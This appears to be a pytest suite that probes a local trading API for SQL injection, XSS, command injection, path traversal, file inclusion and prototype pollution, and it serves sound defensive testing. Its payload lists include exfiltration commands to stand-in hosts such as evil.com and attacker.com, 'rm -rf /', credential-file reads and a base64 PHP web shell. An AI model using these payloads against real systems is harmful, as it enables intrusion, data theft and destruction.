"""
Comprehensive Input Validation Security Tests

Tests SQL injection, XSS, command injection, and other input validation vulnerabilities.
These are real API security tests that validate actual input security mechanisms.
"""

import pytest
import requests
import json
import time
import urllib.parse
from typing import Dict, List, Any, Union
from unittest.mock import patch

from app.middleware import create_jwt_token


class TestSQLInjectionPrevention:
    """Test SQL injection prevention mechanisms."""

    @pytest.fixture
    def base_url(self) -> str:
        """Base URL for API requests."""
        return "http://localhost:8090"

    def create_auth_headers(self, user_id: str = "test_user") -> Dict[str, str]:
        """Create authorization headers for testing."""
        user_data = {"user_id": user_id, "permissions": ["trading", "market_data"]}
        token = create_jwt_token(user_data)
        return {"Authorization": f"Bearer {token}"}

    def test_sql_injection_in_query_parameters(self, base_url: str):
        """Test SQL injection attempts in query parameters."""
        headers = self.create_auth_headers()
        
        # SQL injection payloads
        sql_payloads = [
            "'; DROP TABLE users; --",
            "' OR '1'='1",
            "' OR 1=1 --",
            "'; SELECT * FROM accounts WHERE '1'='1",
            "' UNION SELECT password FROM users --",
            "'; EXEC xp_cmdshell('dir'); --",
            "' AND (SELECT COUNT(*) FROM users) > 0 --",
            "'; WAITFOR DELAY '00:00:05' --",
            "' OR SLEEP(5) --",
            "' OR benchmark(10000000,MD5(1)) --"
        ]
        
        # Test endpoints that might use database queries
        test_endpoints = [
            "/api/v1/stocks/quote",
            "/api/v1/options/quote",
            "/api/v1/account",
        ]
        
        for endpoint in test_endpoints:
            for payload in sql_payloads:
                # Test as symbol parameter
                response = requests.get(
                    f"{base_url}{endpoint}",
                    headers=headers,
                    params={"symbol": payload}
                )
                
                # Should not return 500 (indicating SQL error)
                # Should return 400, 422 (validation error) or 401/403
                assert response.status_code != 500, (
                    f"SQL injection payload '{payload}' caused server error on {endpoint}"
                )
                
                # Check response doesn't contain SQL error messages
                if hasattr(response, 'text'):
                    response_text = response.text.lower()
                    sql_error_indicators = [
                        "syntax error", "mysql error", "sqlite error",
                        "postgresql error", "ora-", "sql state",
                        "column not found", "table doesn't exist",
                        "invalid column", "unknown table"
                    ]
                    
                    for indicator in sql_error_indicators:
                        assert indicator not in response_text, (
                            f"SQL error indicator '{indicator}' found in response for payload '{payload}'"
                        )

    def test_sql_injection_in_json_payloads(self, base_url: str):
        """Test SQL injection attempts in JSON request bodies."""
        headers = self.create_auth_headers()
        headers["Content-Type"] = "application/json"
        
        sql_payloads = [
            "'; DROP TABLE orders; --",
            "' OR '1'='1",
            "' UNION SELECT * FROM accounts --",
        ]
        
        # Test POST endpoints
        post_endpoints = [
            "/api/v1/stocks/order",
            "/api/v1/options/order",
        ]
        
        for endpoint in post_endpoints:
            for payload in sql_payloads:
                # Test SQL injection in various JSON fields
                test_payloads = [
                    {"symbol": payload, "qty": 1, "side": "buy", "type": "market"},
                    {"symbol": "AAPL", "side": payload, "qty": 1, "type": "market"},
                    {"symbol": "AAPL", "qty": 1, "side": "buy", "type": payload},
                    {"symbol": "AAPL", "qty": payload, "side": "buy", "type": "market"},
                ]
                
                for test_payload in test_payloads:
                    try:
                        response = requests.post(
                            f"{base_url}{endpoint}",
                            headers=headers,
                            json=test_payload
                        )
                        
                        # Should not cause SQL errors
                        assert response.status_code != 500, (
                            f"SQL injection in JSON payload caused server error: {test_payload}"
                        )
                        
                    except requests.exceptions.RequestException:
                        # Network errors are acceptable
                        pass

    def test_blind_sql_injection_prevention(self, base_url: str):
        """Test prevention of blind SQL injection attacks."""
        headers = self.create_auth_headers()
        
        # Time-based blind SQL injection payloads
        time_based_payloads = [
            "AAPL' AND (SELECT SLEEP(2)) AND '1'='1",
            "AAPL'; WAITFOR DELAY '00:00:02' --",
            "AAPL' AND BENCHMARK(1000000, MD5(1)) AND '1'='1",
        ]
        
        for payload in time_based_payloads:
            start_time = requests.utils.default_timer()
            
            try:
                response = requests.get(
                    f"{base_url}/api/v1/stocks/quote",
                    headers=headers,
                    params={"symbol": payload},
                    timeout=5  # Reasonable timeout
                )
                
                end_time = requests.utils.default_timer()
                response_time = end_time - start_time
                
                # Response should not be delayed (indicating SQL injection worked)
                assert response_time < 3.0, (
                    f"Response took {response_time}s for payload '{payload}' - "
                    "possible blind SQL injection vulnerability"
                )
                
            except requests.exceptions.Timeout:
                pytest.fail(f"Request timed out for payload '{payload}' - possible SQL injection")
            except requests.exceptions.RequestException:
                # Other network errors are acceptable
                pass


class TestXSSPrevention:
    """Test Cross-Site Scripting (XSS) prevention."""

    @pytest.fixture
    def base_url(self) -> str:
        """Base URL for API requests."""
        return "http://localhost:8090"

    def create_auth_headers(self) -> Dict[str, str]:
        """Create authorization headers for testing."""
        user_data = {"user_id": "test_user", "permissions": ["trading", "market_data"]}
        token = create_jwt_token(user_data)
        return {"Authorization": f"Bearer {token}"}

    def test_reflected_xss_prevention(self, base_url: str):
        """Test prevention of reflected XSS attacks."""
        headers = self.create_auth_headers()
        
        # XSS payloads
        xss_payloads = [
            "<script>alert('xss')</script>",
            "<img src=x onerror=alert('xss')>",
            "javascript:alert('xss')",
            "<svg onload=alert('xss')>",
            "';alert('xss');//",
            "<iframe src=javascript:alert('xss')></iframe>",
            "<body onload=alert('xss')>",
            "<<SCRIPT>alert('xss')//<</SCRIPT>",
            "<script>eval('ale'+'rt(\"xss\")')</script>",
        ]
        
        test_endpoints = [
            "/api/v1/stocks/quote",
            "/api/v1/options/quote",
        ]
        
        for endpoint in test_endpoints:
            for payload in xss_payloads:
                response = requests.get(
                    f"{base_url}{endpoint}",
                    headers=headers,
                    params={"symbol": payload}
                )
                
                if hasattr(response, 'text'):
                    response_text = response.text
                    
                    # Response should not contain unescaped script tags
                    dangerous_patterns = [
                        "<script", "javascript:", "onload=", "onerror=",
                        "onclick=", "onmouseover=", "eval(", "alert("
                    ]
                    
                    for pattern in dangerous_patterns:
                        assert pattern.lower() not in response_text.lower(), (
                            f"Potential XSS vulnerability: '{pattern}' found in response for payload '{payload}'"
                        )

    def test_stored_xss_prevention(self, base_url: str):
        """Test prevention of stored XSS attacks."""
        headers = self.create_auth_headers()
        headers["Content-Type"] = "application/json"
        
        xss_payloads = [
            "<script>document.cookie='stolen'</script>",
            "<img src=x onerror=document.location='http://evil.com'>",
        ]
        
        # Try to store XSS payload via POST requests
        for payload in xss_payloads:
            test_data = {
                "symbol": payload,
                "qty": 1,
                "side": "buy",
                "type": "market"
            }
            
            try:
                response = requests.post(
                    f"{base_url}/api/v1/stocks/order",
                    headers=headers,
                    json=test_data
                )
                
                # Should not store dangerous content
                if response.status_code == 200 and hasattr(response, 'json'):
                    response_data = response.json()
                    response_str = json.dumps(response_data).lower()
                    
                    assert "<script" not in response_str, (
                        f"XSS payload may have been stored: {payload}"
                    )
                    
            except requests.exceptions.RequestException:
                # Network errors are acceptable
                pass

    def test_dom_xss_prevention(self, base_url: str):
        """Test prevention of DOM-based XSS attacks."""
        headers = self.create_auth_headers()
        
        # DOM XSS payloads that might be processed client-side
        dom_xss_payloads = [
            "#<script>alert('dom-xss')</script>",
            "javascript:void(0);alert('dom-xss')",
            "data:text/html,<script>alert('dom-xss')</script>",
        ]
        
        for payload in dom_xss_payloads:
            # Test in URL fragments and parameters
            encoded_payload = urllib.parse.quote(payload)
            
            response = requests.get(
                f"{base_url}/api/v1/stocks/quote?symbol={encoded_payload}",
                headers=headers
            )
            
            if hasattr(response, 'text'):
                response_text = response.text.lower()
                
                # Should not reflect dangerous JavaScript
                assert "javascript:" not in response_text, (
                    f"DOM XSS payload reflected: {payload}"
                )
                assert "data:text/html" not in response_text, (
                    f"DOM XSS payload reflected: {payload}"
                )


class TestCommandInjectionPrevention:
    """Test command injection prevention."""

    @pytest.fixture
    def base_url(self) -> str:
        """Base URL for API requests."""
        return "http://localhost:8090"

    def create_auth_headers(self) -> Dict[str, str]:
        """Create authorization headers for testing."""
        user_data = {"user_id": "test_user", "permissions": ["trading", "market_data"]}
        token = create_jwt_token(user_data)
        return {"Authorization": f"Bearer {token}"}

    def test_os_command_injection_prevention(self, base_url: str):
        """Test prevention of OS command injection."""
        headers = self.create_auth_headers()
        
        # Command injection payloads
        command_payloads = [
            "; ls -la",
            "| cat /etc/passwd",
            "&& whoami",
            "; cat /etc/hosts",
            "| ping -c 1 127.0.0.1",
            "; curl http://evil.com",
            "&& rm -rf /",
            "; python -c 'import os; os.system(\"ls\")'",
            "| powershell Get-Process",
            "&& dir C:\\",
        ]
        
        for payload in command_payloads:
            # Test command injection in symbol parameter
            full_payload = f"AAPL{payload}"
            
            try:
                response = requests.get(
                    f"{base_url}/api/v1/stocks/quote",
                    headers=headers,
                    params={"symbol": full_payload},
                    timeout=5
                )
                
                # Should not execute commands (no long delays)
                if hasattr(response, 'text'):
                    response_text = response.text.lower()
                    
                    # Should not contain command output
                    command_indicators = [
                        "total ", "drwx", "usr/bin", "etc/passwd",
                        "windows", "system32", "ping statistics",
                        "directory of", "volume in drive"
                    ]
                    
                    for indicator in command_indicators:
                        assert indicator not in response_text, (
                            f"Command injection may have succeeded: '{payload}' - found '{indicator}'"
                        )
                
            except requests.exceptions.Timeout:
                pytest.fail(f"Command injection payload '{payload}' caused timeout - possible vulnerability")
            except requests.exceptions.RequestException:
                # Other network errors are acceptable
                pass

    def test_path_traversal_prevention(self, base_url: str):
        """Test prevention of path traversal attacks."""
        headers = self.create_auth_headers()
        
        # Path traversal payloads
        path_traversal_payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "....//....//....//etc//passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "..%252f..%252f..%252fetc%252fpasswd",
            "file:///etc/passwd",
            "file://c:/windows/system32/config/sam",
        ]
        
        for payload in path_traversal_payloads:
            response = requests.get(
                f"{base_url}/api/v1/stocks/quote",
                headers=headers,
                params={"symbol": payload}
            )
            
            if hasattr(response, 'text'):
                response_text = response.text.lower()
                
                # Should not contain file system content
                file_indicators = [
                    "root:x:", "daemon:x:", "system:x:",
                    "[hkey_", "microsoft windows", "admin$"
                ]
                
                for indicator in file_indicators:
                    assert indicator not in response_text, (
                        f"Path traversal may have succeeded: '{payload}' - found '{indicator}'"
                    )


class TestDataTypeValidation:
    """Test data type and format validation."""

    @pytest.fixture
    def base_url(self) -> str:
        """Base URL for API requests."""
        return "http://localhost:8090"

    def create_auth_headers(self) -> Dict[str, str]:
        """Create authorization headers for testing."""
        user_data = {"user_id": "test_user", "permissions": ["trading", "market_data"]}
        token = create_jwt_token(user_data)
        return {"Authorization": f"Bearer {token}"}

    def test_integer_overflow_protection(self, base_url: str):
        """Test protection against integer overflow attacks."""
        headers = self.create_auth_headers()
        headers["Content-Type"] = "application/json"
        
        # Integer overflow payloads
        overflow_values = [
            2147483648,  # Max int32 + 1
            9223372036854775808,  # Max int64 + 1
            -2147483649,  # Min int32 - 1
            "999999999999999999999999999",  # Very large number as string
        ]
        
        for value in overflow_values:
            test_payload = {
                "symbol": "AAPL",
                "qty": value,
                "side": "buy",
                "type": "market"
            }
            
            try:
                response = requests.post(
                    f"{base_url}/api/v1/stocks/order",
                    headers=headers,
                    json=test_payload
                )
                
                # Should return validation error, not crash
                assert response.status_code in [400, 422], (
                    f"Integer overflow value {value} not properly validated"
                )
                
            except requests.exceptions.RequestException:
                # Network errors are acceptable
                pass

    def test_string_length_validation(self, base_url: str):
        """Test string length validation."""
        headers = self.create_auth_headers()
        
        # Very long strings
        long_strings = [
            "A" * 1000,  # 1KB string
            "A" * 10000,  # 10KB string
            "A" * 100000,  # 100KB string (if server allows)
        ]
        
        for long_string in long_strings:
            try:
                response = requests.get(
                    f"{base_url}/api/v1/stocks/quote",
                    headers=headers,
                    params={"symbol": long_string}
                )
                
                # Should handle gracefully
                assert response.status_code in [200, 400, 422], (
                    f"Long string ({len(long_string)} chars) caused server error"
                )
                
            except requests.exceptions.RequestException:
                # Network errors (like connection reset) are acceptable for very long strings
                pass

    def test_null_byte_injection_prevention(self, base_url: str):
        """Test prevention of null byte injection."""
        headers = self.create_auth_headers()
        
        # Null byte payloads
        null_byte_payloads = [
            "AAPL\x00.exe",
            "AAPL\x00../../../etc/passwd",
            "AAPL\x00<script>alert('xss')</script>",
        ]
        
        for payload in null_byte_payloads:
            response = requests.get(
                f"{base_url}/api/v1/stocks/quote",
                headers=headers,
                params={"symbol": payload}
            )
            
            # Should not cause server errors
            assert response.status_code != 500, (
                f"Null byte injection caused server error: {payload!r}"
            )

    def test_unicode_normalization_attacks(self, base_url: str):
        """Test prevention of Unicode normalization attacks."""
        headers = self.create_auth_headers()
        
        # Unicode normalization attack payloads
        unicode_payloads = [
            "AAPL\u202e",  # Right-to-left override
            "AAPL\ufeff",  # Zero-width no-break space
            "AAPL\u200b",  # Zero-width space
            "A\u0041PL",  # Mixed unicode/ASCII
            "\uff21\uff21PL",  # Full-width characters
        ]
        
        for payload in unicode_payloads:
            response = requests.get(
                f"{base_url}/api/v1/stocks/quote",
                headers=headers,
                params={"symbol": payload}
            )
            
            # Should handle Unicode gracefully
            assert response.status_code in [200, 400, 422], (
                f"Unicode payload caused server error: {payload!r}"
            )

    def test_json_structure_validation(self, base_url: str):
        """Test JSON structure validation."""
        headers = self.create_auth_headers()
        headers["Content-Type"] = "application/json"
        
        # Malformed JSON payloads
        malformed_payloads = [
            '{"symbol": "AAPL", "qty": }',  # Missing value
            '{"symbol": "AAPL", "qty": 1, }',  # Trailing comma
            '{"symbol": "AAPL", qty: 1}',  # Unquoted key
            '{"symbol": "AAPL", "qty": 1, "extra": {"nested": {"deep": {"very": {"deep": "value"}}}}}',  # Very deep nesting
        ]
        
        for payload in malformed_payloads:
            try:
                response = requests.post(
                    f"{base_url}/api/v1/stocks/order",
                    headers=headers,
                    data=payload  # Send as raw data, not json
                )
                
                # Should return proper error code for malformed JSON
                assert response.status_code in [400, 422], (
                    f"Malformed JSON not properly rejected: {payload}"
                )
                
            except requests.exceptions.RequestException:
                # Network errors are acceptable
                pass


class TestSecurityHeaderValidation:
    """Test security-related header validation."""

    @pytest.fixture
    def base_url(self) -> str:
        """Base URL for API requests."""
        return "http://localhost:8090"

    def test_content_type_validation(self, base_url: str):
        """Test Content-Type validation."""
        headers = self.create_auth_headers()
        
        # Test various content types
        malicious_content_types = [
            "application/json; charset=utf-7",  # UTF-7 XSS
            "text/html",  # Wrong content type
            "application/x-www-form-urlencoded",  # Form data instead of JSON
            "multipart/form-data",
            "text/xml",
        ]
        
        for content_type in malicious_content_types:
            test_headers = {**headers, "Content-Type": content_type}
            
            try:
                response = requests.post(
                    f"{base_url}/api/v1/stocks/order",
                    headers=test_headers,
                    json={"symbol": "AAPL", "qty": 1, "side": "buy", "type": "market"}
                )
                
                # Should validate content type appropriately
                # (May accept or reject based on endpoint configuration)
                assert response.status_code in [200, 400, 415, 422], (
                    f"Unexpected response for content type {content_type}: {response.status_code}"
                )
                
            except requests.exceptions.RequestException:
                # Network errors are acceptable
                pass

    def create_auth_headers(self) -> Dict[str, str]:
        """Helper method to create auth headers."""
        user_data = {"user_id": "test_user", "permissions": ["trading", "market_data"]}
        token = create_jwt_token(user_data)
        return {"Authorization": f"Bearer {token}"}


class TestRealWorldInjectionAttacks:
    """Test real-world injection attacks with actual API endpoints."""

    @pytest.fixture
    def base_url(self) -> str:
        """Base URL for API requests."""
        return "http://localhost:8090"

    def create_auth_headers(self) -> Dict[str, str]:
        """Create authorization headers for testing."""
        user_data = {"user_id": "injection_test_user", "permissions": ["trading", "market_data"]}
        token = create_jwt_token(user_data)
        return {"Authorization": f"Bearer {token}"}

    def test_advanced_sql_injection_attacks(self, base_url: str):
        """Test advanced SQL injection attacks against real endpoints."""
        headers = self.create_auth_headers()
        
        # Advanced SQL injection payloads
        advanced_sql_payloads = [
            # Boolean-based blind SQL injection
            "AAPL' AND (SELECT SUBSTRING(@@version,1,1))='5'--",
            "AAPL' AND (SELECT COUNT(*) FROM users WHERE username='admin')=1--",
            
            # Time-based blind SQL injection
            "AAPL'; IF (1=1) WAITFOR DELAY '00:00:02'--",
            "AAPL' AND (SELECT COUNT(*) FROM INFORMATION_SCHEMA.TABLES) > 0 AND SLEEP(2)--",
            
            # Union-based SQL injection
            "AAPL' UNION SELECT username,password FROM users--",
            "AAPL' UNION SELECT api_key,secret_key FROM credentials--",
            
            # Error-based SQL injection
            "AAPL' AND (SELECT COUNT(*) FROM users WHERE EXTRACTVALUE(1, CONCAT(0x7e, (SELECT @@version), 0x7e)))--",
            
            # Second-order SQL injection (stored then retrieved)
            "AAPL'; INSERT INTO temp_symbols VALUES ('malicious')--",
            
            # NoSQL injection attempts
            {"$ne": None},
            {"$gt": ""},
            {"$where": "this.symbol == 'AAPL'"},
            {"symbol": {"$regex": ".*"}},
        ]
        
        test_endpoints = [
            "/api/v1/stocks/quote",
            "/api/v1/options/quote",
            "/api/v1/stocks/quotes/batch",
        ]
        
        for endpoint in test_endpoints:
            for payload in advanced_sql_payloads:
                try:
                    if isinstance(payload, str):
                        # String payload in URL parameter
                        response = requests.get(
                            f"{base_url}{endpoint}?symbol={payload}",
                            headers=headers,
                            timeout=10  # Longer timeout for time-based attacks
                        )
                    else:
                        # Object payload (NoSQL injection)
                        response = requests.post(
                            f"{base_url}{endpoint}",
                            headers={**headers, "Content-Type": "application/json"},
                            json={"symbol": payload},
                            timeout=10
                        )
                    
                    # Analyze response for SQL injection indicators
                    if hasattr(response, 'text') and response.text:
                        response_text = response.text.lower()
                        response_time = response.elapsed.total_seconds()
                        
                        # Check for SQL error messages
                        sql_error_patterns = [
                            "sql syntax", "mysql", "postgresql", "sqlite", "ora-",
                            "syntax error", "column not found", "table doesn't exist",
                            "duplicate entry", "constraint", "foreign key"
                        ]
                        
                        for error_pattern in sql_error_patterns:
                            assert error_pattern not in response_text, (
                                f"SQL error exposed for payload '{payload}' on {endpoint}: {error_pattern}"
                            )
                        
                        # Check for time-based SQL injection (response delay)
                        if "sleep" in str(payload).lower() or "waitfor" in str(payload).lower():
                            assert response_time < 3.0, (
                                f"Possible time-based SQL injection: {response_time:.2f}s delay for '{payload}'"
                            )
                        
                        # Check for data disclosure
                        sensitive_data_patterns = [
                            "username", "password", "api_key", "secret_key",
                            "admin", "root", "version", "database"
                        ]
                        
                        for pattern in sensitive_data_patterns:
                            if pattern in response_text and response.status_code == 200:
                                # Could be legitimate data or injection result
                                print(f"INFO: Sensitive pattern '{pattern}' found in {endpoint} response")
                    
                    # Should not return 500 (internal server error)
                    assert response.status_code != 500, (
                        f"SQL injection payload caused server error on {endpoint}: {payload}"
                    )
                    
                except requests.exceptions.Timeout:
                    # Timeout might indicate successful time-based injection
                    if "sleep" in str(payload).lower() or "waitfor" in str(payload).lower():
                        pytest.fail(f"Timeout suggests time-based SQL injection succeeded: {payload}")
                except requests.exceptions.RequestException:
                    # Other network errors are acceptable
                    continue

    def test_advanced_xss_attacks(self, base_url: str):
        """Test advanced XSS attacks against real endpoints."""
        headers = self.create_auth_headers()
        
        # Advanced XSS payloads
        advanced_xss_payloads = [
            # Filter bypass techniques
            "<ScRiPt>alert('xss')</ScRiPt>",
            "<script>a=alert;a('xss')</script>",
            "<svg/onload=alert('xss')>",
            "<img src=x onerror=eval('alert(\'xss\')')>",
            
            # Encoding bypass
            "%3Cscript%3Ealert%28%27xss%27%29%3C%2Fscript%3E",
            "&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;",
            
            # Event handler injection
            "\" onmouseover=\"alert('xss')\"",
            "' onfocus='alert(\"xss\")'",
            
            # JavaScript protocol
            "javascript:alert('xss')",
            "data:text/html,<script>alert('xss')</script>",
            
            # Template injection (if using template engines)
            "{{7*7}}",
            "${7*7}",
            "#{7*7}",
            
            # DOM-based XSS
            "#<script>alert('dom-xss')</script>",
            "';alert('dom-xss');//",
        ]
        
        test_endpoints = [
            "/api/v1/stocks/quote",
            "/api/v1/options/quote",
        ]
        
        for endpoint in test_endpoints:
            for payload in advanced_xss_payloads:
                try:
                    # Test in URL parameter
                    response = requests.get(
                        f"{base_url}{endpoint}?symbol={payload}",
                        headers=headers,
                        timeout=5
                    )
                    
                    if hasattr(response, 'text') and response.text:
                        response_text = response.text
                        
                        # Check for unescaped XSS payload
                        dangerous_patterns = [
                            "<script", "javascript:", "onload=", "onerror=",
                            "onmouseover=", "onfocus=", "alert(", "eval("
                        ]
                        
                        for pattern in dangerous_patterns:
                            assert pattern.lower() not in response_text.lower(), (
                                f"Unescaped XSS payload in response: '{pattern}' from payload '{payload}'"
                            )
                        
                        # Check for template injection results
                        if payload in ["{{7*7}}", "${7*7}", "#{7*7}"]:
                            assert "49" not in response_text, (
                                f"Template injection succeeded: {payload} -> {response_text[:100]}"
                            )
                    
                except requests.exceptions.RequestException:
                    continue

    def test_advanced_command_injection_attacks(self, base_url: str):
        """Test advanced command injection attacks."""
        headers = self.create_auth_headers()
        
        # Advanced command injection payloads
        command_payloads = [
            # Basic command injection
            "AAPL; ls -la",
            "AAPL && whoami",
            "AAPL | cat /etc/passwd",
            "AAPL & dir C:\\",
            
            # Encoded command injection
            "AAPL%3Bls%20-la",
            "AAPL%26%26whoami",
            
            # Time-based command injection
            "AAPL; sleep 3",
            "AAPL && ping -c 1 127.0.0.1",
            "AAPL | timeout 2",
            
            # Data exfiltration attempts
            "AAPL; curl -X POST http://evil.com/steal -d $(cat /etc/passwd)",
            "AAPL && wget http://attacker.com/steal.php?data=$(whoami)",
            
            # Blind command injection
            "AAPL`whoami`",
            "AAPL$(whoami)",
            "AAPL${IFS}whoami",
            
            # Platform-specific
            "AAPL; powershell Get-Process",
            "AAPL && cmd /c dir",
            "AAPL | /bin/bash -c 'whoami'",
        ]
        
        for payload in command_payloads:
            try:
                start_time = time.time()
                
                response = requests.get(
                    f"{base_url}/api/v1/stocks/quote?symbol={payload}",
                    headers=headers,
                    timeout=10
                )
                
                end_time = time.time()
                response_time = end_time - start_time
                
                # Check for command injection indicators
                if hasattr(response, 'text') and response.text:
                    response_text = response.text.lower()
                    
                    # Look for command output patterns
                    command_output_patterns = [
                        "total ", "drwxr", "root:", "system32", "windows",
                        "admin", "user", "uid=", "gid=", "volume in drive"
                    ]
                    
                    for pattern in command_output_patterns:
                        assert pattern not in response_text, (
                            f"Command injection output detected: '{pattern}' from payload '{payload}'"
                        )
                
                # Check for time-based command injection
                if "sleep" in payload or "ping" in payload or "timeout" in payload:
                    assert response_time < 5.0, (
                        f"Possible time-based command injection: {response_time:.2f}s delay"
                    )
                
            except requests.exceptions.Timeout:
                if "sleep" in payload or "ping" in payload:
                    pytest.fail(f"Timeout suggests command injection succeeded: {payload}")
            except requests.exceptions.RequestException:
                continue

    def test_business_logic_injection_attacks(self, base_url: str):
        """Test business logic injection attacks specific to trading APIs."""
        headers = self.create_auth_headers()
        headers["Content-Type"] = "application/json"
        
        # Trading-specific injection attacks
        trading_attacks = [
            # Quantity manipulation
            {"symbol": "AAPL", "qty": "'; DROP TABLE orders; --", "side": "buy"},
            {"symbol": "AAPL", "qty": -999999, "side": "buy"},
            {"symbol": "AAPL", "qty": "Infinity", "side": "buy"},
            
            # Price manipulation
            {"symbol": "AAPL", "qty": 1, "side": "buy", "price": "'; UPDATE orders SET price=0.01; --"},
            {"symbol": "AAPL", "qty": 1, "side": "buy", "price": -1000000},
            
            # Symbol injection
            {"symbol": "'; INSERT INTO orders VALUES ('EVIL', 1000000, 'buy'); --", "qty": 1},
            {"symbol": "<script>alert('xss')</script>", "qty": 1, "side": "buy"},
            {"symbol": "../../../admin", "qty": 1, "side": "buy"},
            
            # Side manipulation
            {"symbol": "AAPL", "qty": 1, "side": "buy'; UPDATE accounts SET balance=1000000; --"},
            {"symbol": "AAPL", "qty": 1, "side": ["buy", "sell"]},  # Array injection
            
            # Type confusion
            {"symbol": {"$ne": None}, "qty": 1, "side": "buy"},  # NoSQL injection
            {"symbol": "AAPL", "qty": {"admin": True}, "side": "buy"},
            
            # Serialization attacks (if using pickle/similar)
            {"symbol": "AAPL", "qty": 1, "side": "buy", "metadata": "__import__('os').system('whoami')"},
        ]
        
        trading_endpoints = [
            "/api/v1/stocks/order",
            "/api/v1/options/order",
        ]
        
        for endpoint in trading_endpoints:
            for attack_payload in trading_attacks:
                try:
                    response = requests.post(
                        f"{base_url}{endpoint}",
                        headers=headers,
                        json=attack_payload,
                        timeout=5
                    )
                    
                    # Should not succeed with injection payloads
                    if response.status_code == 200:
                        print(f"WARNING: Trading injection may have succeeded on {endpoint}")
                        print(f"Payload: {attack_payload}")
                        
                        # Check response for suspicious success
                        if hasattr(response, 'json'):
                            try:
                                response_data = response.json()
                                
                                # Look for signs that injection worked
                                response_str = str(response_data).lower()
                                if any(word in response_str for word in ["admin", "success", "executed"]):
                                    print(f"Suspicious success response: {response_data}")
                                    
                            except:
                                pass
                    
                    # Should properly validate and reject malicious input
                    assert response.status_code in [400, 422, 401, 403], (
                        f"Business logic injection not properly rejected on {endpoint}: {response.status_code}"
                    )
                    
                except requests.exceptions.RequestException:
                    continue

    def test_file_inclusion_attacks(self, base_url: str):
        """Test file inclusion attacks."""
        headers = self.create_auth_headers()
        
        # File inclusion payloads
        file_inclusion_payloads = [
            # Local file inclusion
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "/etc/shadow",
            "C:\\windows\\system32\\config\\system",
            
            # Null byte injection
            "config.php\x00.png",
            "../../../etc/passwd\x00.jpg",
            
            # URL encoding
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "..%252f..%252f..%252fetc%252fpasswd",
            
            # Remote file inclusion
            "http://evil.com/shell.php",
            "ftp://attacker.com/payload.txt",
            "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NdKTs/Pg==",
            
            # PHP wrappers
            "php://filter/read=convert.base64-encode/resource=config.php",
            "expect://whoami",
            "zip://shell.zip#shell.php",
        ]
        
        # Test in various parameters that might handle files
        file_endpoints = [
            "/api/v1/stocks/quote?symbol={}",
            "/api/v1/options/quote?symbol={}",
        ]
        
        for endpoint_template in file_endpoints:
            for payload in file_inclusion_payloads:
                try:
                    endpoint = endpoint_template.format(payload)
                    response = requests.get(f"{base_url}{endpoint}", headers=headers, timeout=5)
                    
                    if hasattr(response, 'text') and response.text:
                        response_text = response.text.lower()
                        
                        # Check for file content indicators
                        file_content_indicators = [
                            "root:x:", "daemon:x:", "[users]", "administrator",
                            "<?php", "#!/bin/", "password", "secret"
                        ]
                        
                        for indicator in file_content_indicators:
                            assert indicator not in response_text, (
                                f"File inclusion succeeded: '{indicator}' found for payload '{payload}'"
                            )
                    
                except requests.exceptions.RequestException:
                    continue

    def test_prototype_pollution_attacks(self, base_url: str):
        """Test prototype pollution attacks (JavaScript/Node.js specific)."""
        headers = self.create_auth_headers()
        headers["Content-Type"] = "application/json"
        
        # Prototype pollution payloads
        pollution_payloads = [
            {"__proto__": {"admin": True}},
            {"constructor": {"prototype": {"admin": True}}},
            {"__proto__.admin": True},
            {"constructor.prototype.admin": True},
            
            # Nested pollution
            {"symbol": "AAPL", "__proto__": {"isAdmin": True}},
            {"qty": 1, "constructor": {"prototype": {"role": "admin"}}},
            
            # Array pollution
            {"symbols": ["AAPL", {"__proto__": {"polluted": True}}]},
        ]
        
        for payload in pollution_payloads:
            try:
                response = requests.post(
                    f"{base_url}/api/v1/stocks/order",
                    headers=headers,
                    json=payload,
                    timeout=5
                )
                
                # Should reject prototype pollution attempts
                assert response.status_code in [400, 422], (
                    f"Prototype pollution payload not rejected: {payload}"
                )
                
            except requests.exceptions.RequestException:
                continue